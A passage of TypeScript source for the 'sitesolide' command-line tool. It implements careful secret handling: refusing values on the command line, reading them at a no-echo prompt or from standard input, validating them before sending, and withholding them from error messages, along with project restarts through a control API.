    give: (slug, who, role) => change(slug, "PUT", { who, role }),
    remove: (slug, who) => change(slug, "DELETE", { who }),
  };
}

// --- secrets and restarts --------------------------------------------------------

/**
 * `sitesolide secrets`, `secrets set` and `secrets remove`, with a token that
 * may manage secrets: the variable names of this folder's project, and the
 * variables of `<slug>.env` set and removed, the only file a token changes.
 * `sitesolide restart`, with any token that deploys the project. The steward
 * judges all of it on the machine (docs/access.md, "Secrets with a token").
 *
 * **A value never comes from the command line.** An argument stays in the
 * shell's history and shows in every user's process list: `set` reads the
 * value from standard input with `--stdin`, or from a prompt that does not
 * echo it. `NAME=value`, or anything after the name, is refused before a
 * request leaves, and no refusal ever quotes an argument that could be a
 * value: a name is named only when it has a variable name's shape. Under
 * `--json` nothing prompts, for the reason `login` gives: `--stdin` is then
 * required.
 *
 * **What the steward would refuse is refused here first**, so that the
 * refusal can say nothing was sent: a name that looks like a value, a value
 * of several lines, too large, or not valid Unicode, a key the prompt does
 * not take. Refused on the machine, the value had already travelled.
 *
 * **A value never comes back.** No route reads one, and nothing here prints
 * the value sent: a refusal that quoted it would be withheld, here as on the
 * dashboard.
 */

/** What `sitesolide secrets` was asked. */
export type SecretsAsk =
  | { action: "list" }
  | { action: "set"; name: string; stdin: boolean; restart: boolean }
  | { action: "remove"; names: string[]; restart: boolean };

/** The shape of a variable name, as the steward reads one: only such a name is ever quoted back. */
const VARIABLE_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;

/**
 * How the keys of common services begin, Stripe's, GitHub's, Slack's, AWS's,
 * GitLab's and sitesolide's own. `sitesolide secrets set sk_live_...` has the
 * shape of a variable name: sent, the key would become a name, journaled for
 * good and listed to every Developer of the project.
 */
export const VALUE_PREFIXES = ["sk_", "rk_", "pk_live", "whsec_", "ghp_", "gho_", "github_pat_", "xox", "AKIA", "sst_", "glpat-"] as const;

/**
 * The longest name taken here. The steward takes 128 characters, but a name
 * that long is far likelier a key pasted in the wrong place than a variable;
 * a longer one is set from the dashboard's Secrets section.
 */
export const NAME_MAX_HERE = 64;

/** Whether an argument where a name goes is more likely a secret's value. */
export function looksLikeValue(argument: string): boolean {
  return argument.length > NAME_MAX_HERE || VALUE_PREFIXES.some((prefix) => argument.startsWith(prefix));
}

/** A value typed where a name goes: refused, never quoted, and its owner told the shell kept it. */
function valueAsName(where: string): Failure {
  return {
    error: "looks-like-value",
    message: `${where} looks like a secret's value, not a variable name: nothing was sent`,
    details: [
      `refused here: a name over ${NAME_MAX_HERE} characters, or starting as service keys do, ${VALUE_PREFIXES.join(", ")}`,
      "if it was a value, it may now be in the shell's history: change it at its source",
      "the value goes at the prompt of sitesolide secrets set NAME, or through a pipe to sitesolide secrets set NAME --stdin",
      "a variable really named so is set from the dashboard's Secrets section",
    ],
  };
}

/** The usage of `secrets`, as the refusals list it. */
const SECRETS_USAGE = [
  "sitesolide secrets                          this folder's project's secret files and variable names",
  "sitesolide secrets set <NAME> [--restart]   its value typed at a prompt that does not echo it",
  "sitesolide secrets set <NAME> --stdin       its value from standard input",
  "sitesolide secrets remove <NAME>...         take variables out",
];

/** A value on the command line: refused, the argument never quoted. */
const valueInArguments: Failure = {
  error: "value-in-arguments",
  message: "a secret's value never goes on the command line, sitesolide secrets set takes a name alone: nothing was sent",
  details: [
    "an argument stays in the shell's history and shows in the process list",
    "type the value at the prompt of sitesolide secrets set NAME, or pipe it to sitesolide secrets set NAME --stdin",
    "if a real value was on that line, change it at its source: the shell's history keeps it",
  ],
};

/**
 * The arguments of `secrets`, read whole before anything is asked or sent.
 * Only the options it takes and a name of a variable's shape are ever named
 * in a refusal: anything else may be a value typed in the wrong place.
 */
export function readSecretsArguments(arguments_: string[]): SecretsAsk | Failure {
  const rest = arguments_[0] === "secrets" ? arguments_.slice(1) : arguments_;
  const json = rest.includes("--json");
  const positional: string[] = [];
  let stdin = false;
  let restart = false;
  for (const argument of rest) {
    if (GLOBAL_OPTIONS.includes(argument)) continue;
    if (argument === "--stdin") stdin = true;
    else if (argument === "--restart") restart = true;
    else if (argument.startsWith("-")) {
      // Not quoted either: `--value=...` is the first thing a hand tries.
      if (argument.includes("=")) return valueInArguments;
      return { error: "unknown-option", message: "an option sitesolide secrets does not take with a token: nothing was sent", details: ["it takes --stdin with set, and --restart with set and remove", ...SECRETS_USAGE] };
    } else positional.push(argument);
  }
  // `NAME=value` wherever it stands, `secrets API_KEY=...` as much as `secrets set API_KEY=...`.
  if (positional.some((argument) => argument.includes("="))) return valueInArguments;
  const [action, ...names] = positional;
  if (action === undefined) {
    if (stdin || restart) return { error: "usage", message: "sitesolide secrets alone lists, and takes no option: nothing was sent", details: SECRETS_USAGE };
    return { action: "list" };
  }
  if (action !== "set" && action !== "remove") {
    // `sitesolide secrets sk_live_...`: the same slip, one word shorter.
    if (looksLikeValue(action)) return valueAsName("secrets: what follows");
    return { error: "usage", message: "sitesolide secrets takes set or remove, or nothing to list: nothing was sent", details: ["a value is never read back through the API", ...SECRETS_USAGE] };
  }
  if (action === "set") {
    const [name, ...extra] = names;
    if (name === undefined) return { error: "usage", message: "secrets set: name the variable, sitesolide secrets set NAME: nothing was sent", details: SECRETS_USAGE };
    // Anything after the name is a value typed on the line, `secrets set API_KEY s3cret`.
    if (extra.length > 0) return valueInArguments;
    // Before the shape: `glpat-...` is no variable name either, and its owner needs the history warning more than the rule.
    if (looksLikeValue(name)) return valueAsName("secrets set: the name");
    if (!VARIABLE_NAME.test(name)) {
      return { error: "invalid", message: "secrets set: the name is not a variable name, letters, digits and underscores, not starting with a digit, 128 characters at most: nothing was sent" };
    }
    // Asked now, before a prompt or a read of standard input: under --json
    // nobody answers one, and an agent's empty input would set an empty value.
    if (json && !stdin) {
      return { error: "needs-stdin", message: "secrets set under --json never prompts: pipe the value to --stdin; nothing was sent", details: ["sitesolide secrets set NAME --stdin --json"] };
    }
    return { action: "set", name, stdin, restart };
  }
  if (stdin) return { error: "usage", message: "--stdin goes with set: secrets remove takes names alone; nothing was sent", details: SECRETS_USAGE };
  if (names.length === 0) return { error: "usage", message: "secrets remove: name the variables, sitesolide secrets remove NAME...: nothing was sent", details: SECRETS_USAGE };
  const valueLike = names.findIndex(looksLikeValue);
  if (valueLike !== -1) return valueAsName(`secrets remove: name ${valueLike + 1}`);
  const malformed = names.findIndex((name) => !VARIABLE_NAME.test(name));
  if (malformed !== -1) {
    return { error: "invalid", message: `secrets remove: name ${malformed + 1} is not a variable name, letters, digits and underscores, not starting with a digit, 128 characters at most: nothing was sent` };
  }
  return { action: "remove", names, restart };
}

/**
 * How the no-echo prompt ends: the value entered, null when it was abandoned,
 * or a refusal saying why, nothing sent.
 */
export type Typed = string | null | { refused: string };

/** Where a line typed without echo stands: the value so far, and `typed` once it ended. */
export type Keying = { value: string; typed?: Typed };

const SEVERAL_LINES = "more than one line arrived at the prompt, a paste of several lines";

/** A control key in words: it is a key pressed, not a part of a value. */
function keyName(character: string): string {
  const code = character.codePointAt(0)!;
  if (character === "\t") return "Tab";
  if (code < 0x20) return `Ctrl-${String.fromCharCode(code + 0x40)}`;
  return `a control character, U+${code.toString(16).toUpperCase().padStart(4, "0")},`;
}

/**
 * One more piece of what was typed, read the way a shell's prompt edits a
 * line. In raw mode the terminal edits nothing: taken as they come, Ctrl-U,
 * Ctrl-W, Ctrl-Z and an arrow's escape sequence would go into the value as
 * characters, which the steward accepts, and the service would read a secret
 * nobody had meant. So Backspace, Ctrl-U and Ctrl-W edit, Enter ends, Ctrl-C and Ctrl-D
 * abandon, and any other control key is refused rather than guessed at.
 *
 * Anything after the line's end is refused too: a paste of several lines
 * would otherwise keep its first line silently.
 */
export function keyIn(value: string, text: string): Keying {
  const characters = Array.from(text);
  let line = Array.from(value);
  for (let i = 0; i < characters.length; i++) {
    const character = characters[i]!;
    if (character === "\u0003" || character === "\u0004") return { value: "", typed: null };
    if (character === "\r" || character === "\n") {
      // A pasted Windows line ends in both: one line still.
      const rest = characters.slice(character === "\r" && characters[i + 1] === "\n" ? i + 2 : i + 1);
      if (rest.length > 0) return { value: "", typed: { refused: SEVERAL_LINES } };
      return { value: line.join(""), typed: line.join("") };
    }
    if (character === "\u007f" || character === "\b") line = line.slice(0, -1);
    else if (character === "\u0015") line = [];
    else if (character === "\u0017") {
      // As readline's unix-word-rubout: the blanks before the cursor, then the word.
      while (line.length > 0 && /\s/u.test(line.at(-1)!)) line.pop();
      while (line.length > 0 && !/\s/u.test(line.at(-1)!)) line.pop();
    } else if (character === "\u001b") return { value: "", typed: { refused: "an arrow key or another escape sequence was typed at the prompt, which takes none" } };
    else if (/\p{Cc}/u.test(character)) return { value: "", typed: { refused: `${keyName(character)} was typed at the prompt, which takes no control key` } };
    else line.push(character);
  }
  return { value: line.join("") };
}

/** The terminal the prompt reads, injectable so that its tests drive every way it ends. */
export type HiddenTerminal = {
  /** Raw mode: no echo, no line editing, Ctrl-C a character rather than a signal. */
  setRawMode: (raw: boolean) => void;
  /** Hands over what arrives, and `end` when the input closes, until the function returned is called. */
  listen: (data: (chunk: Uint8Array) => void, end: () => void) => () => void;
  /** Standard error: standard output carries the events of --json. */
  write: (text: string) => void;
  /** Runs `restore` on SIGINT, SIGTERM and SIGHUP, until the function returned is called. */
  onSignals: (restore: () => void) => () => void;
};

const PROMPT_SIGNALS = ["SIGINT", "SIGTERM", "SIGHUP"] as const;

/** The process's own: standard input in raw mode, the question on standard error. */
export function processTerminal(): HiddenTerminal {
  const input = process.stdin;
  return {
    setRawMode: (raw) => {
      input.setRawMode(raw);
    },
    listen(data, end) {
      const onData = (chunk: Uint8Array | string) => data(typeof chunk === "string" ? new TextEncoder().encode(chunk) : chunk);
      input.on("data", onData);
      input.on("end", end);
      input.resume();
      return () => {
        input.off("data", onData);
        input.off("end", end);
        input.pause();
      };
    },
    write: (text) => {
      process.stderr.write(text);
    },
    onSignals(restore) {
      const handlers = PROMPT_SIGNALS.map((signal) => {
        const handler = () => {
          restore();
          off();
          // Raised again with no handler left, so the run ends as the signal
          // meant, its exit status included, once the terminal echoes again:
          // a run killed in raw mode left the shell typing blind.
          process.kill(process.pid, signal);
        };
        process.on(signal, handler);
        return [signal, handler] as const;
      });
      const off = () => {
        for (const [signal, handler] of handlers) process.off(signal, handler);
      };
      return off;
    },
  };
}

/**
 * How long the prompt keeps reading once the line has ended. A paste arrives
 * in one burst, a few chunks apart by well under this; a person's next key,
 * after Enter, comes far later. What arrives meanwhile is read and dropped
 * here, rather than left for the shell to echo, run and keep in its history.
 */
export const PROMPT_QUIET_MS = 100;

/** However long a paste keeps arriving, the terminal is given back after this. */
const PROMPT_DRAIN_MAX_MS = 2_000;

/**
 * A value typed at the terminal, never echoed, in raw mode as
 * dashboard/scripts/fingerprint.ts reads a password, edited as `keyIn` says.
 *
 * The terminal is given back its echo however the prompt ends: Enter, Ctrl-C,
 * a refusal, the input closing, an exception (the `finally`), or a signal,
 * which raw mode no longer sends for Ctrl-C but `kill` and a closed window
 * still do.
 */
export async function promptWithoutEcho(question: string, terminal: HiddenTerminal = processTerminal(), quietMs = PROMPT_QUIET_MS): Promise<Typed> {
  let raw = false;
  let stopListening = (): void => {};
  let stopSignals = (): void => {};
  let quiet: ReturnType<typeof setTimeout> | undefined;
  let longest: ReturnType<typeof setTimeout> | undefined;
  let finish: (typed: Typed) => void = () => {};
  const restore = (): void => {
    clearTimeout(quiet);
    clearTimeout(longest);
    stopListening();
    stopListening = () => {};
    stopSignals();
    stopSignals = () => {};
    if (!raw) return;
    raw = false;
    terminal.setRawMode(false);
    terminal.write("\n");
  };
  try {
    const typed = new Promise<Typed>((resolve) => {
      finish = resolve;
    });
    terminal.write(question);
    stopSignals = terminal.onSignals(() => {
      restore();
      finish(null);
    });
    terminal.setRawMode(true);
    raw = true;

    const decoder = new TextDecoder("utf-8", { fatal: true });
    let value = "";
    /** Decided, and still reading what follows: `undefined` while typing. */
    let outcome: Typed | undefined;
    /** The line ended on a carriage return whose line feed may come in the next read. */
    let feedDue = false;
    const done = () => finish(outcome === undefined ? null : outcome);
    const drain = () => {
      clearTimeout(quiet);
      quiet = setTimeout(done, quietMs);
    };
    const decide = (decided: Typed) => {
      outcome = decided;
      longest = setTimeout(done, PROMPT_DRAIN_MAX_MS);
      drain();
    };
    stopListening = terminal.listen(
      (chunk) => {
        try {
          if (outcome !== undefined) {
            const feed = feedDue && chunk.length === 1 && chunk[0] === 0x0a;
            feedDue = false;
            // The rest of a paste: the line it follows was not the whole value.
            if (typeof outcome === "string" && !feed) outcome = { refused: SEVERAL_LINES };
            drain();
            return;
          }
          let text: string;
          try {
            text = decoder.decode(chunk, { stream: true });
          } catch {
            decide({ refused: "what arrived at the prompt is not valid UTF-8" });
            return;
          }
          const step = keyIn(value, text);
          value = step.value;
          if (step.typed === undefined) return;
          feedDue = typeof step.typed === "string" && text.endsWith("\r");
          decide(step.typed);
        } catch {
          // Thrown here, nothing would reach the `finally`: the run would end in raw mode.
          outcome = null;
          done();
        }
      },
      () => {
        if (outcome === undefined) outcome = null;
        done();
      },
    );
    return await typed;
  } finally {
    restore();
  }
}

/** The largest value the steward writes: `MAX_VALUE_BYTES` of dashboard/src/secrets/envfile.ts. */
export const MAX_VALUE_BYTES = 8 * 1024;

/**
 * Why the steward would refuse this value, or null, in its own words:
 * `checkValue` of dashboard/src/secrets/envfile.ts, mirrored rather than
 * imported. That module reads dashboard/borrowed/, which the dashboard's
 * borrow script writes and git does not keep: imported, it would break
 * `bun test` in bin/ on a fresh clone, and the binary's build.
 * bin/tests/cli-remote.test.ts runs both over the same values, words included.
 */
export function valueRefusal(value: string): string | null {
  if (value.includes("\n") || value.includes("\r")) return "the value must fit on one line";
  if (value.includes("\0")) return "the value contains a null byte";
  if (!value.isWellFormed()) return "the value is not valid Unicode";
  if (NONCHARACTER.test(value)) return "the value holds a Unicode noncharacter, which systemd refuses";
  if (new TextEncoder().encode(value).length > MAX_VALUE_BYTES) return "the value is larger than 8 KiB";
  return null;
}

/**
 * U+FDD0 to U+FDEF, and U+xxFFFE and U+xxFFFF in every plane: systemd refuses
 * them in a variables file, and drops every variable of the file with them.
 * The steward's own list (dashboard/src/secrets/envfile.ts), which the tests
 * hold side by side with this one.
 */
const NONCHARACTER =
  /[\uFDD0-\uFDEF\uFFFE\uFFFF\u{1FFFE}\u{1FFFF}\u{2FFFE}\u{2FFFF}\u{3FFFE}\u{3FFFF}\u{4FFFE}\u{4FFFF}\u{5FFFE}\u{5FFFF}\u{6FFFE}\u{6FFFF}\u{7FFFE}\u{7FFFF}\u{8FFFE}\u{8FFFF}\u{9FFFE}\u{9FFFF}\u{AFFFE}\u{AFFFF}\u{BFFFE}\u{BFFFF}\u{CFFFE}\u{CFFFF}\u{DFFFE}\u{DFFFF}\u{EFFFE}\u{EFFFF}\u{FFFFE}\u{FFFFF}\u{10FFFE}\u{10FFFF}]/u;

/** A value refused here, before it travels: never quoted. */
function refusedValue(reason: string): Failure {
  return {
    error: "invalid",
    message: `${reason}: nothing was sent`,
    details: [
      "the machine takes a value on one line, without a null byte, in valid Unicode with no noncharacter, 8 KiB at most",
      "a key or a certificate of several lines goes in a file read whole, from the dashboard's Secrets section",
    ],
  };
}

/** A key the prompt does not take, or several lines pasted into it. */
function refusedTyping(reason: string): Failure {
  return {
    error: "invalid",
    message: `${reason}: nothing was sent`,
    details: [
      "at the prompt, Backspace, Ctrl-U and Ctrl-W edit the value, Enter ends it, Ctrl-C abandons it",
      "what followed was read and dropped here, not passed to the shell",
      "a value of several lines goes in a file read whole, from the dashboard's Secrets section",
    ],
  };
}

/**
 * `--stdin` reads a pipe. At a terminal, `Bun.stdin.text()` would read the
 * value with the terminal's echo on, the value on screen and in the scrollback,
 * until Ctrl-D: a pipe forgotten, and the value shown to whoever looks.
 */
const stdinIsTerminal: Failure = {
  error: "stdin-is-terminal",
  message: "--stdin reads a pipe, and standard input is this terminal, where the value would show as it is typed: nothing was sent",
  details: ["pipe the value: <command> | sitesolide secrets set NAME --stdin", "or drop --stdin to be prompted without echo: sitesolide secrets set NAME"],
};

/**
 * All of standard input, decoded strictly: `Bun.stdin.text()` turns a byte
 * that is not UTF-8 into U+FFFD, and the steward would write that, not what
 * was piped. null when it is not UTF-8.
 */
async function readStandardInput(): Promise<string | null> {
  try {
    return new TextDecoder("utf-8", { fatal: true }).decode(await Bun.stdin.bytes());
  } catch {
    return null;
  }
}

/**
 * Whether a change may have reached the machine though no answer came back.
 * A connection refused sent nothing. A connection dropped once the request
 * had left, or an answer cut or replaced by a proxy's page, may follow a
 * write already made: the dashboard's idle timeout can close the connection
 * while a write followed by a restart is still running.
 */
function unanswered(answer: Answer<unknown>, thrown: unknown): boolean {
  if (answer.ok) return false;
  if (answer.failure.error === "unreachable") return (thrown as { code?: unknown } | null)?.code !== "ConnectionRefused";
  return answer.failure.error === "unreadable" && (answer.status < 400 || answer.status >= 500);
}

/** A change sent whose answer never came: said as what it is, and how to check, rather than "unreachable". */
function unconfirmed(file: string, failure: Failure, restart: boolean): Failure {
  return {
    error: "unconfirmed",
    message: `the change of ${file} was sent and its answer never came: it may have been written`,
    details: [
      failure.message,
      `sitesolide secrets lists the names in ${file}: a name removed is gone once the change is written, a name set is there`,
      "no value is read back, so a set over a value already there cannot be checked: running the same command again writes the change once more, harmlessly",
      ...(restart ? ["the restart may have been made too: sitesolide status shows the service"] : []),
    ],
  };
}

/**
 * A refusal with no value of the request in it: the steward quotes none,
 * the dashboard withholds a message that would, and this is the third lock.
 */
function withheld(failure: Failure, values: readonly string[]): Failure {
  const quotes = (text: string) => values.some((value) => value.length >= 4 && text.includes(value));
  if (!quotes(failure.message) && !(failure.details ?? []).some(quotes)) return failure;
  return { error: failure.error, message: "the dashboard refused the change; its message is withheld: see the project's Activity", ...(failure.wait === undefined ? {} : { wait: failure.wait }) };
}

/** A secret file as a token lists it: names, never a value, a size nor a previous version. */
type TokenFile = {
  name: string;
  kind: "variables" | "content";
  state: "managed" | "absent" | "unmanaged";
  reason: string | null;
  variables: readonly string[];
  passwords: readonly string[];
  restartPending?: boolean;
  writable: boolean;
};

type ProjectSecrets = { slug: string; service: { unit: string; state: string; subState: string } | null; files: TokenFile[] };

type Verdict = { kind: "active" | "looping" | "failure" | "scheduled"; state: string; subState: string; restarts: number };

type RestartOutcome = { verdict: Verdict } | Failure;

type SecretsChange = { file: TokenFile; created: boolean; set: string[]; removed: string[]; absent: string[]; restart: RestartOutcome | null };

const isRecord = (value: unknown): value is Record<string, unknown> => typeof value === "object" && value !== null && !Array.isArray(value);
const isStrings = (value: unknown): value is string[] => Array.isArray(value) && value.every((one) => typeof one === "string");
const isFile = (value: unknown): value is TokenFile =>
  isRecord(value) && typeof value.name === "string" && typeof value.state === "string" && isStrings(value.variables) && typeof value.writable === "boolean";
const isVerdict = (value: unknown): value is Verdict =>
  isRecord(value) && typeof value.kind === "string" && typeof value.state === "string" && typeof value.subState === "string" && typeof value.restarts === "number";

/** A verdict in words: what systemd says, and whether the service holds. */
function verdictWords(verdict: Verdict): string {
  const said = { active: "holds", looping: "restarts in a loop", failure: "did not come back", scheduled: "restarts once this answer has left" }[verdict.kind] ?? verdict.kind;
  return `${verdict.state}, ${verdict.subState}, ${verdict.restarts} restart(s) by systemd: the service ${said}`;
}

/** A restart that did not leave the service running: the run fails, saying what was already done. */
function restartFailed(slug: string, verdict: Verdict, done: string[] = []): Failure {
  return {
    error: "restart-failed",
    message: `the service of ${slug} did not hold after its restart: ${verdictWords(verdict)}`,
    details: [...done, "sitesolide logs says why"],
  };
}

/** The lines of one file, in the listing. */
export function secretFileLines(file: TokenFile): string[] {
  const elsewhere = "set from the dashboard's Secrets section";
  if (file.state === "absent") return [`   ${file.name}: missing, ${file.writable ? `sitesolide secrets set NAME creates it` : `created from the dashboard's Secrets section`}`];
  if (file.state === "unmanaged") return [`   ${file.name}: not managed by the dashboard${file.reason === null ? "" : `, ${file.reason}`}`];
  if (file.kind === "content") return [`   ${file.name}: a file read whole, ${elsewhere}`];
  const passwords = file.passwords ?? [];
  const names = file.variables.filter((name) => !passwords.includes(name));
  return [
    `   ${file.name}: ${names.length === 0 ? "no variable yet" : names.join(", ")}`,
    ...passwords.map((name) => `      ${name}: a password hash, changed from the dashboard alone`),
    ...(file.writable ? [] : [`      read only with a token: ${elsewhere}`]),
    ...(file.restartPending === true ? ["      restart pending: changed since the service started, sitesolide restart applies it"] : []),
  ];
}

/** This folder's project's slug, from its manifest, as `share` and `logs` read it. */
function folderSlug(folder: string): string | Failure {
  const path = join(folder, "sitesolide.json");
  if (!existsSync(path)) return { error: "invalid", message: `sitesolide.json not found in ${folder}: run this from the project's folder` };
  const { manifest } = checkManifest(readFileSync(path, "utf8"));
  if (manifest === undefined) return { error: "invalid", message: "sitesolide.json rejected" };
  return manifest.slug;
}

const notCarried = (remote: Remote, what: string): Failure => ({
  error: "not-available",
  message: `the dashboard at ${remote.api} does not carry ${what} by token yet: the owner of the machine runs sitesolide upgrade`,
});

async function listSecrets(remote: Remote, slug: string, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const answer: Answer<{ secrets: ProjectSecrets }> = await call(remote, `/api/v1/projects/${encodeURIComponent(slug)}/secrets`, {}, dependencies.fetcher);
  if (predatesRoute(answer)) return report(output, notCarried(remote, "secrets"));
  if (!answer.ok) return report(output, answer.failure);
  const secrets = answer.body.secrets;
  if (!isRecord(secrets) || !Array.isArray(secrets.files) || !secrets.files.every(isFile)) {
    return report(output, { error: "unreadable", message: `${remote.api} answered with something that is not the control API's secrets` });
  }
  output.say(`-> secrets of ${slug}, through ${remote.api}`);
  const service = isRecord(secrets.service) ? secrets.service : null;
  output.say(`   service: ${service === null ? "none" : `${service.state}, ${service.subState}`}`);
  if (secrets.files.length === 0) output.say("   no secret file: its sitesolide.json declares none");
  for (const file of secrets.files) for (const line of secretFileLines(file)) output.say(line);
  output.say("   a value is never read back: sitesolide secrets set NAME writes one");
  output.succeeded("secrets", { slug, secrets });
  return 0;
}

/**
 * One change of `<slug>.env`, all or nothing on the machine, then, asked
 * for, the restart. A refused restart leaves the change written, and says
 * so: running the same command again sets the same value, harmlessly.
 */
async function changeSecrets(remote: Remote, slug: string, ask: Extract<SecretsAsk, { action: "set" | "remove" }>, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const file = `${slug}.env`;
  let set: [string, string][] = [];
  if (ask.action === "set") {
    let value: string;
    const atTerminal = (dependencies.terminal ?? (() => process.stdin.isTTY === true))();
    if (ask.stdin) {
      // Asked before anything is read: reading is what would echo.
      if (atTerminal) return report(output, stdinIsTerminal);
      const piped = dependencies.stdin === undefined ? await readStandardInput() : await dependencies.stdin();
      if (piped === null) return report(output, refusedValue("the value piped is not valid UTF-8"));
      // One trailing line break is the pipe's, `echo` adds one: never the value's.
      value = piped.replace(/\r?\n$/, "");
    } else if (atTerminal) {
      const typed = await (dependencies.secretPrompt ?? promptWithoutEcho)(`${ask.name} for ${file} (no echo): `);
      if (typed === null) return report(output, { error: "cancelled", message: "nothing typed: nothing was sent" });
      if (typeof typed !== "string") return report(output, refusedTyping(typed.refused));
      value = typed;
    } else {
      return report(output, { error: "needs-stdin", message: "no terminal to type the value in: pipe it to --stdin; nothing was sent", details: ["sitesolide secrets set NAME --stdin"] });
    }
    // An unset variable piped by mistake reads as nothing: it would empty
    // the secret in service without a word.
    if (value === "") return report(output, { error: "invalid", message: "the value is empty: nothing was sent", details: ["to take a variable out: sitesolide secrets remove NAME"] });
    const refusal = valueRefusal(value);
    if (refusal !== null) return report(output, refusedValue(refusal));
    set = [[ask.name, value]];
  }
  const values = set.map(([, value]) => value);
  output.say(`-> ${file}, through ${remote.api}`);
  // Object.fromEntries defines the name as the object's own: `__proto__` stays a variable.
  const body = { ...(set.length > 0 ? { set: Object.fromEntries(set) } : {}), ...(ask.action === "remove" ? { remove: ask.names } : {}), ...(ask.restart ? { restart: true } : {}) };
  // What fetch threw, kept to tell a connection refused, which sent nothing, from one dropped.
  let thrown: unknown = null;
  const fetcher = dependencies.fetcher ?? fetch;
  const answer: Answer<SecretsChange> = await call(
    remote,
    `/api/v1/projects/${encodeURIComponent(slug)}/secrets/${encodeURIComponent(file)}`,
    { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) },
    async (input, init) => {
      try {
        return await fetcher(input, init);
      } catch (error) {
        thrown = error;
        throw error;
      }
    },
  );
  if (predatesRoute(answer)) return report(output, notCarried(remote, "secrets"));
  if (!answer.ok && unanswered(answer, thrown)) return report(output, withheld(unconfirmed(file, answer.failure, ask.restart), values));
  if (!answer.ok) return report(output, withheld(answer.failure, values));
  const change = answer.body;
  if (!isRecord(change) || !isFile(change.file) || !isStrings(change.set) || !isStrings(change.removed) || !isStrings(change.absent)) {
    return report(output, { error: "unreadable", message: `${remote.api} answered with something that is not the control API's change of secrets` });
  }
  if (change.created === true) output.say(`   ${file} created, as the project's manifest declares it`);
  if (change.set.length > 0) output.say(`   set: ${change.set.join(", ")}`);
  if (change.removed.length > 0) output.say(`   removed: ${change.removed.join(", ")}`);
  if (change.absent.length > 0) output.say(`   not in ${file}, nothing to remove: ${change.absent.join(", ")}`);
  const done = [
    ...(change.set.length > 0 ? [`set in ${file}: ${change.set.join(", ")}`] : []),
    ...(change.removed.length > 0 ? [`removed from ${file}: ${change.removed.join(", ")}`] : []),
  ];
  const result = { slug, file, created: change.created === true, set: change.set, removed: change.removed, absent: change.absent, restart: change.restart ?? null };
  const outcome = change.restart;
  if (!ask.restart || outcome === null || outcome === undefined) {
    if (change.file.restartPending === true) output.say("   the service reads it once restarted: sitesolide restart, or --restart with the change");
    output.succeeded("secrets", { action: ask.action, ...result });
    return 0;
  }
  output.say("-> restart");
  const read: Record<string, unknown> = isRecord(outcome) ? outcome : {};
  const verdict = read.verdict;
  if (!isVerdict(verdict)) {
    const refusal: Failure =
      typeof read.error === "string" && typeof read.message === "string"
        ? { error: read.error, message: read.message, ...(typeof read.wait === "number" ? { wait: read.wait } : {}) }
        : { error: "unreadable", message: `${remote.api} answered a restart with something that is not a verdict` };
    return report(output, { ...refusal, message: `the change is written, the restart was not made: ${refusal.message}`, details: done });
  }
  output.say(`   ${verdictWords(verdict)}`);
  if (verdict.kind !== "active") return report(output, restartFailed(slug, verdict, [...done, "the change is written"]));
  output.succeeded("secrets", { action: ask.action, ...result });
  return 0;
}

/** The project's service restarted and watched for a few seconds: the exit code says whether it holds. */
async function restartProject(remote: Remote, slug: string, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  output.say(`-> restart ${slug}, through ${remote.api}`);
  const answer: Answer<{ verdict: Verdict }> = await call(remote, `/api/v1/projects/${encodeURIComponent(slug)}/restart`, { method: "POST" }, dependencies.fetcher);
  if (predatesRoute(answer)) return report(output, notCarried(remote, "restarts"));
  if (!answer.ok) return report(output, answer.failure);
  const verdict = isRecord(answer.body) ? answer.body.verdict : null;
  if (!isVerdict(verdict)) return report(output, { error: "unreadable", message: `${remote.api} answered a restart with something that is not a verdict` });
  output.say(`   ${verdictWords(verdict)}`);
  if (verdict.kind !== "active") return report(output, restartFailed(slug, verdict));
  output.succeeded("restart", { slug, verdict });
  return 0;
}

/** What a command that needs the machine's root says through the API. */
export function needsSsh(command: string): Failure {
  return {
    error: "needs-ssh",
    message: `sitesolide ${command} needs the owner's SSH access to the machine`,
    details: [
      "with a token, this workstation runs: deploy, status, logs, share, secrets, restart, login",
      "ask the owner of the machine, who runs it from a workstation configured with sitesolide init",
    ],
  };
}

/**
 * The options each command takes through the API, and whether one carries a
 * value. Anything else is refused before a request leaves, rather than passed
 * over: `--dry-run` passed over deployed for real, the live site replaced by
 * a run its author believed changed nothing. A dry run needs the owner's SSH
 * reads, which a token does not have, and the control API has no route that
 * judges without deploying; until it does, the option is refused, saying so.
 */
const REMOTE_OPTIONS: Readonly<Record<string, Readonly<Record<string, boolean>>>> = {
  deploy: {},
  status: {},
  logs: { "--follow": false, "--lines": true },
  login: { "--url": true, "--token-stdin": false },
  share: SHARE_OPTIONS,
  // Read by readSecretsArguments, which never quotes what it refuses.
  secrets: { "--stdin": false, "--restart": false },
  restart: {},
};

/** Every command takes these two: they choose the output and the mode, read before here. */
const GLOBAL_OPTIONS = ["--json", "--api"];

/** The refusal of an option the command does not take through the API, or null. */
export function unknownOptions(command: string, arguments_: string[]): Failure | null {
  const known = REMOTE_OPTIONS[command] ?? {};
  const rest = arguments_[0] === command ? arguments_.slice(1) : arguments_;
  for (let i = 0; i < rest.length; i++) {
    const option = rest[i]!;
    if (GLOBAL_OPTIONS.includes(option)) continue;
    if (Object.hasOwn(known, option)) {
      if (known[option]) i++;
      continue;
    }
    if (!option.startsWith("-")) continue;
    if (command === "deploy" && option === "--dry-run") {
      return {
        error: "no-dry-run",
        message: "deploy --dry-run is not available with a token: nothing was sent",
        details: [
          "a dry run reads the machine over the owner's SSH access, which a token does not carry",
          "through the API, the machine judges the manifest when the deployment starts, before anything is built or uploaded",
          "review sitesolide.json, then run sitesolide deploy",
        ],
      };
    }
    const takes = Object.keys(known);
    return {
      error: "unknown-option",
      message: `${option}: not an option of sitesolide ${command} with a token: nothing was sent`,
      details: [
        takes.length === 0 ? `with a token, sitesolide ${command} takes no option` : `with a token, sitesolide ${command} takes ${takes.join(", ")}`,
        ...(option === "--yes" || option === "--slug" ? ["a folder without sitesolide.json: write it first with sitesolide detect --write, review it, then deploy"] : []),
      ],
    };
  }
  return null;
}

/** The commands only the owner's SSH access carries. */
export const SSH_COMMANDS = ["lock", "unlock", "domain", "remove", "run", "people", "refresh", "backups"];

export const REMOTE_USAGE = [
  "usage, with a token:",
